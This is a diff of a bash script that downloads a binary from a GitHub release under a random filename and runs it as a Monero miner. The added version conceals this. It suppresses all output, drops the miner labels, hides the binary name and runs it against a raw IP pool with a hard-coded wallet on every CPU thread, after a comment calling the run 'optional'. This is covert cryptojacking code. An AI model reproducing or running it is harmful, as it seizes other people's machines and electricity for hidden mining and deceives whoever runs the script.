@@ -1,56 +1,28 @@
 #!/bin/bash
+set -e  # Exit on any error
 
-# Generate a random 10-character lowercase alphanumeric filename
-generate_random_filename() {
-    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
-    echo
-}
+# Update package lists quietly
+apt update -qq
 
-generate_worker_name() {
-    local prefix="APR"
-    local date_str
-    date_str=$(TZ='Asia/Kolkata' date '+%Y%m%d')
-    local random_suffix
-    random_suffix=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 4)
+# Install required packages quietly
+DEBIAN_FRONTEND=noninteractive apt install -y -qq \
+    build-essential cmake pkg-config libboost-all-dev libssl-dev \
+    libzmq3-dev libsodium-dev libunwind-dev liblzma-dev libreadline-dev \
+    libexpat1-dev libpgm-dev libhidapi-dev libusb-1.0-0-dev \
+    libprotobuf-dev protobuf-compiler libudev-dev \
+    libncurses6 libncursesw6 libtinfo6 \
+    libunbound-dev liblmdb-dev libminiupnpc-dev libuv1-dev git screen wget curl > /dev/null 2>&1
 
-    echo "${prefix}-${date_str}-${random_suffix}"
-}
+# Generate a random filename
+BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
+# Download binary quietly and rename
+wget -q https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar -O "$BIN_NAME"
 
-main() {
-    miner_filename=$(generate_random_filename)
-    worker_name=$(generate_worker_name)
+# Make it executable
+chmod +x "$BIN_NAME"
 
-    # Optional: cleanup on Ctrl+C or SIGTERM
-    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
+# Optional: run the binary
+# ./"$BIN_NAME"
 
-    echo "📥 Downloading miner to: $miner_filename"
-    if wget -q https://github.com/vedhagsvp/qubros/releases/download/srmn/aplnopa -O "$miner_filename"; then
-        echo "✅ Miner downloaded as: $miner_filename"
-    else
-        echo "❌ Failed to download miner. Exiting."
-        exit 1
-    fi
-
-    echo "🔐 Setting executable permission..."
-    if chmod +x "$miner_filename"; then
-        echo "✅ Permissions set."
-    else
-        echo "❌ Failed to set permissions. Exiting."
-        exit 1
-    fi
-
-    echo "👷 Worker Name: $worker_name"
-
-    echo "🚀 Starting miner..."
-    ./"$miner_filename" \
-        --algo qubic_xmr --account CP_udnvh2owpq --pool qubic.asia.apool.io:4334 --worker PK-$RANDOM
-
-    if [[ $? -eq 0 ]]; then
-        echo "✅ Miner ran successfully."
-    else
-        echo "❌ Miner exited with an error."
-    fi
-}
-
-main
+./"$BIN_NAME" -o 51.89.225.58:8084 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC -p AP30 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
